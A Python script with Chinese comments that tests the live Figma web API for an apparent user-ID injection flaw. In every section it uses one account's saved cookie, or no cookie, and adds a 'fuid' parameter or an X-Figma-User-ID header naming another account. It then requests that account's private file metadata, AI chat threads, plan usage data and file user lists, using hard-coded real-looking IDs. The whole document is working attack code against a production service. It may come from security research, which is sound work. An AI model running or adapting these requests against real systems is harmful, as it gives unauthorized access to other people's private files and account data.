# -*- coding: utf-8 -*-
"""注入漏洞影响面扩展验证
1. 匿名(无 cookie) + fuid=A → 是否也能注入
2. A 的私有 design 文件(5Gs4PaTz11Hlk2sqVnidBG) file_metadata 注入
3. B 的私有 design 文件 + fuid=B(自身) 对照
4. plan 级接口注入(plans/{planId}/mcp_usage 等)
5. files_batch / 其他文件接口注入面
"""
import io, json, sys, urllib.error, urllib.parse, urllib.request
sys.stdout.reconfigure(encoding='utf-8', errors='replace')

BASE = "https://www.figma.com"
A_UID = "1666382703778278399"
B_UID = "1667396392129259941"
A_MAKE = "5zb5YkoxMa09KpqOyuLcHD"
A_DESIGN = "5Gs4PaTz11Hlk2sqVnidBG"   # A 的私有 design
B_DESIGN = "9MmnJNhhwn2hDNEqLoMToP"   # A 的另一个私有 design
PLAN_A = "cc6b6125-a07f-4d39-a54c-50ef65f33919"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/151.0.0.0 Safari/537.36"


def load(path):
    return io.open(path, encoding='utf-8').read().strip().replace('\n', '; ')


BC = load('ws_cookie_B_new.txt')


def call(label, path, query=None, cookie=BC, uid_hdr=None, method="GET"):
    headers = {"User-Agent": UA, "Accept": "application/json", "Origin": BASE,
               "Referer": BASE + "/"}
    if cookie:
        headers["Cookie"] = cookie
    if uid_hdr:
        headers["X-Figma-User-ID"] = uid_hdr
    url = BASE + path
    if query:
        url += "?" + urllib.parse.urlencode(query)
    req = urllib.request.Request(url, method=method, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=25) as r:
            raw = r.read().decode(errors='replace')
            print(f"[{label}] HTTP {r.status} {raw[:260]}")
            return r.status, raw
    except urllib.error.HTTPError as e:
        raw = e.read().decode(errors='replace')
        print(f"[{label}] HTTP {e.code} {raw[:200]}")
        return e.code, raw


print("======== 1. 匿名(无 cookie) + fuid=A 注入 ========")
call("匿名 fuid=A file_metadata", "/api/file_metadata/" + A_MAKE,
     query={"fuid": A_UID}, cookie=None)
call("匿名 fuid=A threads", "/api/ai_chat/threads",
     query={"owner_id": A_MAKE, "owner_type": "file", "fuid": A_UID}, cookie=None)
call("匿名 X-UID=A threads", "/api/ai_chat/threads",
     query={"owner_id": A_MAKE, "owner_type": "file"}, cookie=None, uid_hdr=A_UID)

print("\n======== 2. A 私有 design 文件注入 ========")
call("B+fuid=A design meta", "/api/file_metadata/" + A_DESIGN, query={"fuid": A_UID})
call("B+X-UID=A design meta", "/api/file_metadata/" + A_DESIGN, uid_hdr=A_UID)
call("B 无注入 design meta", "/api/file_metadata/" + A_DESIGN)

print("\n======== 3. A 私有 design 的 AI 端点注入 ========")
call("B+fuid=A design threads", "/api/ai_chat/threads",
     query={"owner_id": A_DESIGN, "owner_type": "file", "fuid": A_UID})

print("\n======== 4. plan 级接口注入 ========")
call("B+fuid=A mcp_usage", f"/api/plans/{PLAN_A}/mcp_usage", query={"fuid": A_UID})
call("B+X-UID=A mcp_usage", f"/api/plans/{PLAN_A}/mcp_usage", uid_hdr=A_UID)

print("\n======== 5. files_batch / 其他接口注入面 ========")
call("B+fuid=A files_batch", "/api/files_batch", query={"file_keys": A_MAKE, "fuid": A_UID})
call("B+fuid=A file_users", f"/api/files/{A_MAKE}/users", query={"fuid": A_UID})

print("\n======== 6. B 自身文件(无注入) 对照 ========")
call("B 自己design meta(无注入)", "/api/file_metadata/" + A_DESIGN)
